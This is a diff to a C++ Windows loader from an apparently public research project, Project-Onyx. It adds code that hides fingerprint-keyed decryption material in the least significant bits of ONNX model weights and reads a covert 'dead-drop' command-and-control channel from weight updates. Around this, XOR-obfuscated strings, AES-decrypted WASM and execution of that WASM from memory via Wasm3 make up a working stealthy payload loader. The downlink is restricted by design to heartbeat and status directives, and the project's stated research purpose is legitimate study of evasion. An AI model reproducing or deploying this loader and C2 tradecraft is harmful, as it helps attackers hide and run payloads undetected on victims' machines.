@@ -2,9 +2,10 @@
 // Author: X-3306
 // Project: https://github.com/X-3306/Project-Onyx 
 // Phase 1 - Machine fingerprint -> SHA-256
-// Phase 2 - Hash -> ONNX model from .rsrc -> metadata vault unlock
-// Phase 3 - encrypted WASM from .rsrc -> AES-256-CBC -> raw WASM bytes in RAM
-// Phase 4 - Wasm3: host function registration -> module execution from RAM
+// Phase 2 - Hash -> ONNX model from .rsrc -> bait workload + weight/metadata vault unlock
+// Phase 3 - Dead-Drop C2 via downlink model updates -> heartbeat/status only
+// Phase 4 - encrypted WASM from .rsrc -> AES-256-CBC -> raw WASM bytes in RAM
+// Phase 5 - Wasm3: host function registration -> module execution from RAM
 //
 // Host functions exposed to the WASM module:
 //   host.get_fingerprint_ptr  () -> i32   ptr to SHA-256 hex copied into WASM memory
@@ -21,6 +22,7 @@
 // Build:
 //   Use the repository CMake project
 
+#define NOMINMAX
 #include <windows.h>
 #include <sddl.h>
 #include <bcrypt.h>
@@ -30,11 +32,6 @@
 #ifndef NT_SUCCESS
 #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
 #endif
-
-#include <onnxruntime_cxx_api.h>
-#include "wasm3.h"
-#include "m3_env.h"
-#include "resource.h"
 
 #include <string>
 #include <vector>
@@ -50,6 +47,15 @@
 #include <cstdlib>
 #include <mutex>
 #include <utility>
+#include <map>
+#include <set>
+#include <limits>
+#include <cmath>
+
+#include <onnxruntime_cxx_api.h>
+#include "wasm3.h"
+#include "m3_env.h"
+#include "resource.h"
 
 #pragma comment(lib, "bcrypt.lib")
 #pragma comment(lib, "advapi32.lib")
@@ -57,7 +63,7 @@
 #pragma comment(lib, "winhttp.lib")
 
 // -----------------------------------------------------------------------------
-// Minimal string literal obfuscation. This does not replace cryptography,
+// Minimal string literal obfuscation. This does NOT REPLACE cryptography,
 // but it limits casual extraction of clear paths/API names with strings.exe.
 // -----------------------------------------------------------------------------
 
@@ -534,6 +540,44 @@ static DWORD PostSlackHeartbeat(
     return status;
 }
 
+static void WriteLabHeartbeatOutputIfConfigured(HostContext& hostCtx)
+{
+    const std::wstring outputPath =
+        GetEnvVarW(XOR_W(L"PROJECT_ONYX_LAB_OUTPUT_PATH").c_str());
+    if (outputPath.empty())
+        return;
+
+    std::string payload;
+    {
+        std::lock_guard<std::mutex> lock(hostCtx.resultMutex);
+        payload = hostCtx.resultJson.empty() ? "{}" : hostCtx.resultJson;
+    }
+    payload.push_back('\n');
+
+    HandleGuard file;
+    file.h = CreateFileW(outputPath.c_str(),
+                         GENERIC_WRITE,
+                         0,
+                         nullptr,
+                         CREATE_ALWAYS,
+                         FILE_ATTRIBUTE_NORMAL,
+                         nullptr);
+    if (file.h == INVALID_HANDLE_VALUE)
+        ThrowWin32("CreateFileW(lab heartbeat)");
+
+    DWORD written = 0;
+    if (!WriteFile(file.h,
+                   payload.data(),
+                   static_cast<DWORD>(payload.size()),
+                   &written,
+                   nullptr) ||
+        written != payload.size())
+    {
+        ThrowWin32("WriteFile(lab heartbeat)");
+    }
+    SecureZeroString(payload);
+}
+
 // -----------------------------------------------------------------------------
 // Phase 1a - MachineGuid
 // -----------------------------------------------------------------------------
@@ -905,6 +949,1093 @@ static std::string LookupOnnxMetadata(
     return std::string(value.get());
 }
 
+static std::string NormalizeAesKeyMaterial(const std::string& modelOutput);
+static std::vector<uint8_t> DecryptAes256CbcRawKey(
+    const uint8_t* encryptedData,
+    DWORD encryptedSize,
+    const std::vector<uint8_t>& keyBytes);
+
+// -----------------------------------------------------------------------------
+// ONNX weight vault reader
+//
+// This is a deliberately tiny protobuf walker for the generated ONNX model. It
+// extracts LSBs from FLOAT TensorProto.raw_data initializers without pulling a
+// full protobuf parser into the native host.
+// -----------------------------------------------------------------------------
+
+static bool ReadProtoVarint(
+    const uint8_t*& cursor,
+    const uint8_t* end,
+    uint64_t& value)
+{
+    value = 0;
+    unsigned shift = 0;
+    while (cursor < end && shift < 64)
+    {
+        const uint8_t byte = *cursor++;
+        value |= static_cast<uint64_t>(byte & 0x7Fu) << shift;
+        if ((byte & 0x80u) == 0)
+            return true;
+        shift += 7;
+    }
+    return false;
+}
+
+static bool SkipProtoField(
+    const uint8_t*& cursor,
+    const uint8_t* end,
+    uint32_t wireType)
+{
+    uint64_t length = 0;
+    switch (wireType)
+    {
+    case 0:
+        return ReadProtoVarint(cursor, end, length);
+    case 1:
+        if (static_cast<size_t>(end - cursor) < 8) return false;
+        cursor += 8;
+        return true;
+    case 2:
+        if (!ReadProtoVarint(cursor, end, length)) return false;
+        if (length > static_cast<uint64_t>(end - cursor)) return false;
+        cursor += static_cast<size_t>(length);
+        return true;
+    case 5:
+        if (static_cast<size_t>(end - cursor) < 4) return false;
+        cursor += 4;
+        return true;
+    default:
+        return false;
+    }
+}
+
+static void AppendFloatTensorRawLsbBits(
+    const uint8_t* data,
+    size_t size,
+    std::vector<uint8_t>& bits)
+{
+    const uint8_t* cursor = data;
+    const uint8_t* end = data + size;
+    uint64_t dataType = 0;
+    const uint8_t* rawData = nullptr;
+    size_t rawSize = 0;
+
+    while (cursor < end)
+    {
+        uint64_t tag = 0;
+        if (!ReadProtoVarint(cursor, end, tag)) return;
+        const uint32_t field = static_cast<uint32_t>(tag >> 3);
+        const uint32_t wire = static_cast<uint32_t>(tag & 0x07u);
+
+        if (field == 2 && wire == 0)
+        {
+            if (!ReadProtoVarint(cursor, end, dataType)) return;
+        }
+        else if (field == 9 && wire == 2)
+        {
+            uint64_t length = 0;
+            if (!ReadProtoVarint(cursor, end, length)) return;
+            if (length > static_cast<uint64_t>(end - cursor)) return;
+            rawData = cursor;
+            rawSize = static_cast<size_t>(length);
+            cursor += rawSize;
+        }
+        else if (!SkipProtoField(cursor, end, wire))
+        {
+            return;
+        }
+    }
+
+    if (dataType != 1 || !rawData || rawSize < 4)
+        return;
+    for (size_t i = 0; i + 3 < rawSize; i += 4)
+        bits.push_back(rawData[i] & 0x01u);
+}
+
+static void AppendGraphFloatInitializerLsbBits(
+    const uint8_t* data,
+    size_t size,
+    std::vector<uint8_t>& bits)
+{
+    const uint8_t* cursor = data;
+    const uint8_t* end = data + size;
+    while (cursor < end)
+    {
+        uint64_t tag = 0;
+        if (!ReadProtoVarint(cursor, end, tag)) return;
+        const uint32_t field = static_cast<uint32_t>(tag >> 3);
+        const uint32_t wire = static_cast<uint32_t>(tag & 0x07u);
+        if (field == 5 && wire == 2)
+        {
+            uint64_t length = 0;
+            if (!ReadProtoVarint(cursor, end, length)) return;
+            if (length > static_cast<uint64_t>(end - cursor)) return;
+            AppendFloatTensorRawLsbBits(cursor, static_cast<size_t>(length), bits);
+            cursor += static_cast<size_t>(length);
+        }
+        else if (!SkipProtoField(cursor, end, wire))
+        {
+            return;
+        }
+    }
+}
+
+static std::vector<uint8_t> ExtractOnnxFloatWeightLsbBits(
+    const void* modelData,
+    size_t modelSize)
+{
+    const uint8_t* cursor = static_cast<const uint8_t*>(modelData);
+    const uint8_t* end = cursor + modelSize;
+    std::vector<uint8_t> bits;
+
+    while (cursor < end)
+    {
+        uint64_t tag = 0;
+        if (!ReadProtoVarint(cursor, end, tag)) break;
+        const uint32_t field = static_cast<uint32_t>(tag >> 3);
+        const uint32_t wire = static_cast<uint32_t>(tag & 0x07u);
+        if (field == 7 && wire == 2)
+        {
+            uint64_t length = 0;
+            if (!ReadProtoVarint(cursor, end, length)) break;
+            if (length > static_cast<uint64_t>(end - cursor)) break;
+            AppendGraphFloatInitializerLsbBits(cursor, static_cast<size_t>(length), bits);
+            cursor += static_cast<size_t>(length);
+        }
+        else if (!SkipProtoField(cursor, end, wire))
+        {
+            break;
+        }
+    }
+
+    return bits;
+}
+
+static std::vector<uint8_t> BytesToBits(const std::vector<uint8_t>& bytes)
+{
+    std::vector<uint8_t> bits;
+    bits.reserve(bytes.size() * 8);
+    for (uint8_t byte : bytes)
+        for (int shift = 7; shift >= 0; --shift)
+            bits.push_back(static_cast<uint8_t>((byte >> shift) & 1u));
+    return bits;
+}
+
+static std::vector<uint8_t> BitsToBytes(const std::vector<uint8_t>& bits)
+{
+    if ((bits.size() % 8) != 0)
+        throw std::runtime_error("weight vault: non-byte-aligned bit stream");
+    std::vector<uint8_t> out;
+    out.reserve(bits.size() / 8);
+    for (size_t i = 0; i < bits.size(); i += 8)
+    {
+        uint8_t value = 0;
+        for (size_t j = 0; j < 8; ++j)
+            value = static_cast<uint8_t>((value << 1) | (bits[i + j] & 1u));
+        out.push_back(value);
+    }
+    return out;
+}
+
+static std::vector<size_t> DeterministicWeightPositions(
+    const std::string& triggerHex,
+    size_t total,
+    size_t count,
+    const char* domain,
+    const std::set<size_t>& excluded = {})
+{
+    if (count > total || count > total - excluded.size())
+        throw std::runtime_error("weight vault: insufficient capacity");
+
+    std::string seedInput = "Project-Onyx weight vault positions v1|";
+    seedInput += domain;
+    seedInput += "|";
+    seedInput += triggerHex;
+    std::vector<uint8_t> seed = Sha256Bytes(seedInput);
+
+    std::vector<size_t> selected;
+    selected.reserve(count);
+    std::set<size_t> used = excluded;
+    uint64_t counter = 0;
+    const uint64_t total64 = static_cast<uint64_t>(total);
+    const uint64_t remainder =
+        ((std::numeric_limits<uint64_t>::max() % total64) + 1ULL) % total64;
+    const uint64_t limit =
+        (remainder == 0) ? std::numeric_limits<uint64_t>::max()
+                         : (std::numeric_limits<uint64_t>::max() - remainder + 1ULL);
+
+    while (selected.size() < count)
+    {
+        std::string material(reinterpret_cast<const char*>(seed.data()), seed.size());
+        for (int shift = 56; shift >= 0; shift -= 8)
+            material.push_back(static_cast<char>((counter >> shift) & 0xFFu));
+        ++counter;
+
+        std::vector<uint8_t> block = Sha256Bytes(material);
+        for (size_t offset = 0; offset + 7 < block.size(); offset += 8)
+        {
+            uint64_t raw = 0;
+            for (size_t i = 0; i < 8; ++i)
+                raw = (raw << 8) | block[offset + i];
+            if (remainder != 0 && raw >= limit)
+                continue;
+            const size_t candidate = static_cast<size_t>(raw % total64);
+            if (used.find(candidate) != used.end())
+                continue;
+            used.insert(candidate);
+            selected.push_back(candidate);
+            if (selected.size() == count)
+                break;
+        }
+    }
+    return selected;
+}
+
+static std::map<std::string, std::string> ParseKeyValueRecord(const std::string& text)
+{
+    std::map<std::string, std::string> fields;
+    size_t start = 0;
+    while (start < text.size())
+    {
+        size_t end = text.find('\n', start);
+        if (end == std::string::npos) end = text.size();
+        std::string line = text.substr(start, end - start);
+        if (!line.empty())
+        {
+            size_t eq = line.find('=');
+            if (eq == std::string::npos)
+                throw std::runtime_error("weight vault: invalid record line");
+            fields[line.substr(0, eq)] = line.substr(eq + 1);
+        }
+        start = end + 1;
+    }
+    return fields;
+}
+
+static std::string UnlockKeyMaterialFromVaultFields(
+    const std::map<std::string, std::string>& fields,
+    const std::string& hashPrompt,
+    const char* sourceLabel)
+{
+    auto requireField = [&](const char* key) -> const std::string& {
+        auto it = fields.find(key);
+        if (it == fields.end())
+        {
+            std::ostringstream oss;
+            oss << sourceLabel << ": missing " << key;
+            throw std::runtime_error(oss.str());
+        }
+        return it->second;
+    };
+
+    const std::string& schema = requireField("schema");
+    const std::string& kdf = requireField("kdf");
+    if (schema != "onyx-v1")
+        throw std::runtime_error(std::string(sourceLabel) + ": unsupported schema");
+    if (kdf != "pbkdf2-hmac-sha256")
+        throw std::runtime_error(std::string(sourceLabel) + ": unsupported KDF");
+
+    const ULONG iterations =
+        static_cast<ULONG>(std::strtoul(requireField("kdf_iterations").c_str(), nullptr, 10));
+    if (iterations < 10000)
+        throw std::runtime_error(std::string(sourceLabel) + ": invalid KDF iterations");
+
+    std::vector<uint8_t> salt = Base64Decode(requireField("kdf_salt"));
+    std::vector<uint8_t> triggerExpected = HexDecode(requireField("trigger_hmac"));
+    std::vector<uint8_t> iv = Base64Decode(requireField("vault_iv"));
+    std::vector<uint8_t> ciphertext = Base64Decode(requireField("vault_ct"));
+    std::vector<uint8_t> vaultMacExpected = HexDecode(requireField("vault_hmac"));
+
+    SensitiveBytesGuard saltGuard(salt);
+    SensitiveBytesGuard triggerExpectedGuard(triggerExpected);
+    SensitiveBytesGuard ivGuard(iv);
+    SensitiveBytesGuard ciphertextGuard(ciphertext);
+    SensitiveBytesGuard vaultMacExpectedGuard(vaultMacExpected);
+
+    std::vector<uint8_t> master = Pbkdf2Sha256(hashPrompt, salt, iterations);
+    SensitiveBytesGuard masterGuard(master);
+
+    std::vector<uint8_t> vaultKey = HkdfSha256(master, "onyx-vault-enc-v1");
+    std::vector<uint8_t> vaultMacKey = HkdfSha256(master, "onyx-vault-mac-v1");
+    std::vector<uint8_t> triggerMacKey = HkdfSha256(master, "onyx-trigger-hmac-v1");
+    SensitiveBytesGuard vaultKeyGuard(vaultKey);
+    SensitiveBytesGuard vaultMacKeyGuard(vaultMacKey);
+    SensitiveBytesGuard triggerMacKeyGuard(triggerMacKey);
+
+    std::vector<uint8_t> triggerGot = HmacSha256(triggerMacKey, hashPrompt);
+    SensitiveBytesGuard triggerGotGuard(triggerGot);
+    if (!ConstantTimeEqual(triggerGot, triggerExpected))
+        throw std::runtime_error(std::string(sourceLabel) + ": trigger mismatch");
+
+    std::vector<uint8_t> vaultMacGot =
+        HmacSha256(vaultMacKey, ciphertext.data(), ciphertext.size());
+    SensitiveBytesGuard vaultMacGotGuard(vaultMacGot);
+    if (!ConstantTimeEqual(vaultMacGot, vaultMacExpected))
+        throw std::runtime_error(std::string(sourceLabel) + ": vault MAC mismatch");
+
+    std::vector<uint8_t> encryptedVault;
+    encryptedVault.reserve(iv.size() + ciphertext.size());
+    encryptedVault.insert(encryptedVault.end(), iv.begin(), iv.end());
+    encryptedVault.insert(encryptedVault.end(), ciphertext.begin(), ciphertext.end());
+    SensitiveBytesGuard encryptedVaultGuard(encryptedVault);
+
+    std::vector<uint8_t> raw =
+        DecryptAes256CbcRawKey(encryptedVault.data(),
+                               static_cast<DWORD>(encryptedVault.size()),
+                               vaultKey);
+    SensitiveBytesGuard rawGuard(raw);
+
+    const char magic[] = {'O', 'N', 'X', '1'};
+    if (raw.size() <= sizeof(magic) ||
+        std::memcmp(raw.data(), magic, sizeof(magic)) != 0)
+        throw std::runtime_error(std::string(sourceLabel) + ": vault magic mismatch");
+
+    std::string keyMaterial(
+        reinterpret_cast<const char*>(raw.data() + sizeof(magic)),
+        raw.size() - sizeof(magic));
+    keyMaterial = NormalizeAesKeyMaterial(keyMaterial);
+    if (keyMaterial.size() != 32)
+        throw std::runtime_error(std::string(sourceLabel) + ": invalid key material length");
+
+    return keyMaterial;
+}
+
+static std::string UnlockKeyMaterialFromOnnxWeightVault(
+    const void* modelData,
+    size_t modelSize,
+    const std::string& hashPrompt)
+{
+    std::vector<uint8_t> carrierBits = ExtractOnnxFloatWeightLsbBits(modelData, modelSize);
+    if (carrierBits.size() < 64)
+        throw std::runtime_error("ONNX weight vault: not enough float32 weights");
+
+    std::vector<size_t> headerPositions =
+        DeterministicWeightPositions(hashPrompt, carrierBits.size(), 32, "header");
+    std::vector<uint8_t> headerBits;
+    headerBits.reserve(headerPositions.size());
+    for (size_t pos : headerPositions)
+        headerBits.push_back(carrierBits[pos]);
+    std::vector<uint8_t> headerBytes = BitsToBytes(headerBits);
+    uint32_t payloadLen = 0;
+    for (uint8_t byte : headerBytes)
+        payloadLen = (payloadLen << 8) | byte;
+    if (payloadLen < 8 || payloadLen > ((carrierBits.size() - 32) / 8))
+        throw std::runtime_error("ONNX weight vault: invalid payload length");
+
+    std::set<size_t> excluded(headerPositions.begin(), headerPositions.end());
+    std::vector<size_t> payloadPositions =
+        DeterministicWeightPositions(hashPrompt, carrierBits.size(), payloadLen * 8, "payload", excluded);
+    std::vector<uint8_t> payloadBits;
+    payloadBits.reserve(payloadPositions.size());
+    for (size_t pos : payloadPositions)
+        payloadBits.push_back(carrierBits[pos]);
+    std::vector<uint8_t> payloadBytes = BitsToBytes(payloadBits);
+    const std::string payloadText(
+        reinterpret_cast<const char*>(payloadBytes.data()),
+        payloadBytes.size());
+    const std::string magic = "ONXW1\n";
+    if (payloadText.rfind(magic, 0) != 0)
+        throw std::runtime_error("ONNX weight vault: magic mismatch");
+
+    std::map<std::string, std::string> fields = ParseKeyValueRecord(payloadText.substr(magic.size()));
+    auto schemaIt = fields.find("weight_vault_schema");
+    if (schemaIt == fields.end() || schemaIt->second != "onyx-weight-vault-v1")
+        throw std::runtime_error("ONNX weight vault: unsupported schema");
+    fields.erase(schemaIt);
+    return UnlockKeyMaterialFromVaultFields(fields, hashPrompt, "ONNX weight vault");
+}
+
+// -----------------------------------------------------------------------------
+// Optional ONNX model-update downlink
+//
+// Public research mode only: the native host may consume one operator-provided
+// model update and apply an authenticated directive that is limited to heartbeat
+// acknowledgement or a safe status string. The update model is never executed;
+// it is only parsed as bytes for float32 LSB extraction.
+// -----------------------------------------------------------------------------
+
+struct FloatWeightSnapshot
+{
+    std::vector<float> values;
+    std::vector<uint8_t> lsbBits;
+};
+
+struct DownlinkDirective
+{
+    std::string type;
+    std::string status;
+    std::string nonce;
+    uint64_t expiresUnix = 0;
+};
+
+static void AppendLittleEndianFloatWords(
+    const uint8_t* data,
+    size_t size,
+    FloatWeightSnapshot& out)
+{
+    if (!data || size < 4)
+        return;
+
+    for (size_t i = 0; i + 3 < size; i += 4)
+    {
+        const uint32_t word =
+            static_cast<uint32_t>(data[i]) |
+            (static_cast<uint32_t>(data[i + 1]) << 8) |
+            (static_cast<uint32_t>(data[i + 2]) << 16) |
+            (static_cast<uint32_t>(data[i + 3]) << 24);
+        float value = 0.0f;
+        std::memcpy(&value, &word, sizeof(value));
+        out.values.push_back(value);
+        out.lsbBits.push_back(static_cast<uint8_t>(word & 0x01u));
+    }
+}
+
+static void AppendFloatTensorWeights(
+    const uint8_t* data,
+    size_t size,
+    FloatWeightSnapshot& out)
+{
+    const uint8_t* cursor = data;
+    const uint8_t* end = data + size;
+    uint64_t dataType = 0;
+    const uint8_t* rawData = nullptr;
+    size_t rawSize = 0;
+    std::vector<uint8_t> floatData;
+
+    while (cursor < end)
+    {
+        uint64_t tag = 0;
+        if (!ReadProtoVarint(cursor, end, tag)) return;
+        const uint32_t field = static_cast<uint32_t>(tag >> 3);
+        const uint32_t wire = static_cast<uint32_t>(tag & 0x07u);
+
+        if (field == 2 && wire == 0)
+        {
+            if (!ReadProtoVarint(cursor, end, dataType)) return;
+        }
+        else if (field == 4 && wire == 2)
+        {
+            uint64_t length = 0;
+            if (!ReadProtoVarint(cursor, end, length)) return;
+            if (length > static_cast<uint64_t>(end - cursor)) return;
+            floatData.insert(floatData.end(), cursor, cursor + static_cast<size_t>(length));
+            cursor += static_cast<size_t>(length);
+        }
+        else if (field == 4 && wire == 5)
+        {
+            if (static_cast<size_t>(end - cursor) < 4) return;
+            floatData.insert(floatData.end(), cursor, cursor + 4);
+            cursor += 4;
+        }
+        else if (field == 9 && wire == 2)
+        {
+            uint64_t length = 0;
+            if (!ReadProtoVarint(cursor, end, length)) return;
+            if (length > static_cast<uint64_t>(end - cursor)) return;
+            rawData = cursor;
+            rawSize = static_cast<size_t>(length);
+            cursor += rawSize;
+        }
+        else if (!SkipProtoField(cursor, end, wire))
+        {
+            return;
+        }
+    }
+
+    if (dataType != 1)
+        return;
+    if (rawData && rawSize >= 4)
+        AppendLittleEndianFloatWords(rawData, rawSize, out);
+    else if (!floatData.empty())
+        AppendLittleEndianFloatWords(floatData.data(), floatData.size(), out);
+}
+
+static void AppendGraphFloatInitializerWeights(
+    const uint8_t* data,
+    size_t size,
+    FloatWeightSnapshot& out)
+{
+    const uint8_t* cursor = data;
+    const uint8_t* end = data + size;
+    while (cursor < end)
+    {
+        uint64_t tag = 0;
+        if (!ReadProtoVarint(cursor, end, tag)) return;
+        const uint32_t field = static_cast<uint32_t>(tag >> 3);
+        const uint32_t wire = static_cast<uint32_t>(tag & 0x07u);
+        if (field == 5 && wire == 2)
+        {
+            uint64_t length = 0;
+            if (!ReadProtoVarint(cursor, end, length)) return;
+            if (length > static_cast<uint64_t>(end - cursor)) return;
+            AppendFloatTensorWeights(cursor, static_cast<size_t>(length), out);
+            cursor += static_cast<size_t>(length);
+        }
+        else if (!SkipProtoField(cursor, end, wire))
+        {
+            return;
+        }
+    }
+}
+
+static FloatWeightSnapshot ExtractOnnxFloatWeightSnapshot(
+    const void* modelData,
+    size_t modelSize)
+{
+    const uint8_t* cursor = static_cast<const uint8_t*>(modelData);
+    const uint8_t* end = cursor + modelSize;
+    FloatWeightSnapshot out;
+
+    while (cursor < end)
+    {
+        uint64_t tag = 0;
+        if (!ReadProtoVarint(cursor, end, tag)) break;
+        const uint32_t field = static_cast<uint32_t>(tag >> 3);
+        const uint32_t wire = static_cast<uint32_t>(tag & 0x07u);
+        if (field == 7 && wire == 2)
+        {
+            uint64_t length = 0;
+            if (!ReadProtoVarint(cursor, end, length)) break;
+            if (length > static_cast<uint64_t>(end - cursor)) break;
+            AppendGraphFloatInitializerWeights(cursor, static_cast<size_t>(length), out);
+            cursor += static_cast<size_t>(length);
+        }
+        else if (!SkipProtoField(cursor, end, wire))
+        {
+            break;
+        }
+    }
+
+    return out;
+}
+
+static std::vector<size_t> NaturalDownlinkCandidatePositions(
+    const FloatWeightSnapshot& reference,
+    const FloatWeightSnapshot& update)
+{
+    if (reference.values.size() != update.values.size())
+        return {};
+
+    static constexpr double kNaturalMinAbsDelta = 1.0e-5;
+    std::vector<size_t> candidates;
+    for (size_t i = 0; i < reference.values.size(); ++i)
+    {
+        const double delta =
+            static_cast<double>(update.values[i]) -
+            static_cast<double>(reference.values[i]);
+        if (std::fabs(delta) >= kNaturalMinAbsDelta)
+            candidates.push_back(i);
+    }
+    return candidates;
+}
+
+static bool ReadDownlinkRecordFromCandidates(
+    const std::vector<uint8_t>& bits,
+    const std::vector<size_t>& candidates,
+    const std::string& hashPrompt,
+    std::vector<uint8_t>& payload)
+{
+    if (candidates.size() < 32)
+        return false;
+
+    std::vector<size_t> headerOffsets =
+        DeterministicWeightPositions(hashPrompt, candidates.size(), 32, "downlink-header-v1");
+    std::vector<uint8_t> headerBits;
+    headerBits.reserve(headerOffsets.size());
+    for (size_t offset : headerOffsets)
+    {
+        if (offset >= candidates.size() || candidates[offset] >= bits.size())
+            return false;
+        headerBits.push_back(bits[candidates[offset]]);
+    }
+
+    std::vector<uint8_t> headerBytes = BitsToBytes(headerBits);
+    uint32_t payloadLen = 0;
+    for (uint8_t byte : headerBytes)
+        payloadLen = (payloadLen << 8) | byte;
+
+    static constexpr size_t kDownlinkMagicLen = 6;
+    static constexpr size_t kMinPayloadLen = kDownlinkMagicLen + 18;
+    const size_t maxPayloadLen = (candidates.size() - 32) / 8;
+    if (payloadLen < kMinPayloadLen ||
+        payloadLen > maxPayloadLen ||
+        payloadLen > (std::numeric_limits<size_t>::max() / 8))
+    {
+        return false;
+    }
+
+    std::set<size_t> excluded(headerOffsets.begin(), headerOffsets.end());
+    std::vector<size_t> payloadOffsets =
+        DeterministicWeightPositions(
+            hashPrompt,
+            candidates.size(),
+            static_cast<size_t>(payloadLen) * 8,
+            "downlink-payload-v1",
+            excluded);
+
+    std::vector<uint8_t> payloadBits;
+    payloadBits.reserve(payloadOffsets.size());
+    for (size_t offset : payloadOffsets)
+    {
+        if (offset >= candidates.size() || candidates[offset] >= bits.size())
+            return false;
+        payloadBits.push_back(bits[candidates[offset]]);
+    }
+
+    payload = BitsToBytes(payloadBits);
+    return true;
+}
+
+static bool ParseUnsignedLongField(const std::string& text, ULONG& value)
+{
+    if (text.empty() || text.size() > 10)
+        return false;
+    unsigned long parsed = 0;
+    for (char ch : text)
+    {
+        if (ch < '0' || ch > '9')
+            return false;
+        parsed = parsed * 10UL + static_cast<unsigned long>(ch - '0');
+        if (parsed > 5000000UL)
+            return false;
+    }
+    if (parsed == 0)
+        return false;
+    value = static_cast<ULONG>(parsed);
+    return true;
+}
+
+static bool IsSafeDownlinkText(
+    const std::string& value,
+    size_t maxLen,
+    bool allowSpace)
+{
+    if (value.empty() || value.size() > maxLen)
+        return false;
+
+    for (unsigned char ch : value)
+    {
+        if (std::isalnum(ch) ||
+            ch == '_' || ch == '.' || ch == ':' || ch == '+' || ch == '-')
+        {
+            continue;
+        }
+        if (allowSpace && ch == ' ')
+            continue;
+        return false;
+    }
+    return true;
+}
+
+static size_t FindJsonValueStart(
+    const std::string& json,
+    const char* key)
+{
+    std::string needle = "\"";
+    needle += key;
+    needle += "\"";
+
+    size_t pos = json.find(needle);
+    if (pos == std::string::npos)
+        return std::string::npos;
+    pos += needle.size();
+
+    while (pos < json.size() && std::isspace(static_cast<unsigned char>(json[pos])))
+        ++pos;
+    if (pos >= json.size() || json[pos] != ':')
+        return std::string::npos;
+    ++pos;
+    while (pos < json.size() && std::isspace(static_cast<unsigned char>(json[pos])))
+        ++pos;
+    return pos;
+}
+
+static bool JsonStringValue(
+    const std::string& json,
+    const char* key,
+    std::string& value)
+{
+    size_t pos = FindJsonValueStart(json, key);
+    if (pos == std::string::npos || pos >= json.size() || json[pos] != '"')
+        return false;
+    ++pos;
+
+    value.clear();
+    while (pos < json.size())
+    {
+        const char ch = json[pos++];
+        if (ch == '"')
+            return true;
+        if (ch == '\\')
+            return false;
+        if (static_cast<unsigned char>(ch) < 0x20)
+            return false;
+        value.push_back(ch);
+        if (value.size() > 128)
+            return false;
+    }
+    return false;
+}
+
+static bool JsonUint64Value(
+    const std::string& json,
+    const char* key,
+    uint64_t& value)
+{
+    size_t pos = FindJsonValueStart(json, key);
+    if (pos == std::string::npos || pos >= json.size() ||
+        json[pos] < '0' || json[pos] > '9')
+    {
+        return false;
+    }
+
+    uint64_t parsed = 0;
+    while (pos < json.size() && json[pos] >= '0' && json[pos] <= '9')
+    {
+        const uint64_t digit = static_cast<uint64_t>(json[pos] - '0');
+        if (parsed > ((std::numeric_limits<uint64_t>::max() - digit) / 10ULL))
+            return false;
+        parsed = parsed * 10ULL + digit;
+        ++pos;
+    }
+    value = parsed;
+    return true;
+}
+
+static bool ParseAndValidateDownlinkJson(
+    const std::string& json,
+    DownlinkDirective& directive)
+{
+    DownlinkDirective parsed;
+    if (!JsonStringValue(json, "type", parsed.type))
+        return false;
+    if (!JsonStringValue(json, "nonce", parsed.nonce))
+        return false;
+    if (!JsonUint64Value(json, "expires_unix", parsed.expiresUnix))
+        return false;
+
+    if (parsed.type != "heartbeat_ack" && parsed.type != "set_status")
+        return false;
+    if (!IsSafeDownlinkText(parsed.nonce, 96, false))
+        return false;
+    if (parsed.expiresUnix == 0)
+        return false;
+
+    const std::time_t now = std::time(nullptr);
+    if (now > 0 && parsed.expiresUnix < static_cast<uint64_t>(now))
+        return false;
+
+    if (parsed.type == "set_status")
+    {
+        if (!JsonStringValue(json, "status", parsed.status))
+            return false;
+        if (!IsSafeDownlinkText(parsed.status, 64, true))
+            return false;
+    }
+
+    directive = parsed;
+    return true;
+}
+
+static bool DirectiveFromDownlinkFields(
+    const std::map<std::string, std::string>& fields,
+    const std::string& hashPrompt,
+    DownlinkDirective& directive)
+{
+    auto requireField = [&](const char* key) -> const std::string& {
+        auto it = fields.find(key);
+        if (it == fields.end())
+            throw std::runtime_error("downlink: missing field");
+        return it->second;
+    };
+
+    if (requireField("downlink_schema") != "onyx-downlink-v1")
+        return false;
+    if (requireField("kdf") != "pbkdf2-hmac-sha256")
+        return false;
+
+    ULONG iterations = 0;
+    if (!ParseUnsignedLongField(requireField("kdf_iterations"), iterations))
+        return false;
+
+    std::vector<uint8_t> salt = Base64Decode(requireField("kdf_salt"));
+    std::vector<uint8_t> triggerExpected = HexDecode(requireField("trigger_hmac"));
+    std::vector<uint8_t> iv = Base64Decode(requireField("downlink_iv"));
+    std::vector<uint8_t> ciphertext = Base64Decode(requireField("downlink_ct"));
+    std::vector<uint8_t> hmacExpected = HexDecode(requireField("downlink_hmac"));
+
+    SensitiveBytesGuard saltGuard(salt);
+    SensitiveBytesGuard triggerExpectedGuard(triggerExpected);
+    SensitiveBytesGuard ivGuard(iv);
+    SensitiveBytesGuard ciphertextGuard(ciphertext);
+    SensitiveBytesGuard hmacExpectedGuard(hmacExpected);
+
+    std::vector<uint8_t> master = Pbkdf2Sha256(hashPrompt, salt, iterations);
+    SensitiveBytesGuard masterGuard(master);
+
+    std::vector<uint8_t> encKey = HkdfSha256(master, "onyx-downlink-enc-v1");
+    std::vector<uint8_t> macKey = HkdfSha256(master, "onyx-downlink-mac-v1");
+    std::vector<uint8_t> triggerMacKey = HkdfSha256(master, "onyx-downlink-trigger-hmac-v1");
+    SensitiveBytesGuard encKeyGuard(encKey);
+    SensitiveBytesGuard macKeyGuard(macKey);
+    SensitiveBytesGuard triggerMacKeyGuard(triggerMacKey);
+
+    const std::string triggerInput = "onyx-downlink-v1|" + hashPrompt;
+    std::vector<uint8_t> triggerGot = HmacSha256(triggerMacKey, triggerInput);
+    SensitiveBytesGuard triggerGotGuard(triggerGot);
+    if (!ConstantTimeEqual(triggerGot, triggerExpected))
+        return false;
+
+    std::vector<uint8_t> encrypted;
+    encrypted.reserve(iv.size() + ciphertext.size());
+    encrypted.insert(encrypted.end(), iv.begin(), iv.end());
+    encrypted.insert(encrypted.end(), ciphertext.begin(), ciphertext.end());
+    SensitiveBytesGuard encryptedGuard(encrypted);
+
+    std::vector<uint8_t> hmacGot =
+        HmacSha256(macKey, encrypted.data(), encrypted.size());
+    SensitiveBytesGuard hmacGotGuard(hmacGot);
+    if (!ConstantTimeEqual(hmacGot, hmacExpected))
+        return false;
+
+    std::vector<uint8_t> raw =
+        DecryptAes256CbcRawKey(
+            encrypted.data(),
+            static_cast<DWORD>(encrypted.size()),
+            encKey);
+    SensitiveBytesGuard rawGuard(raw);
+
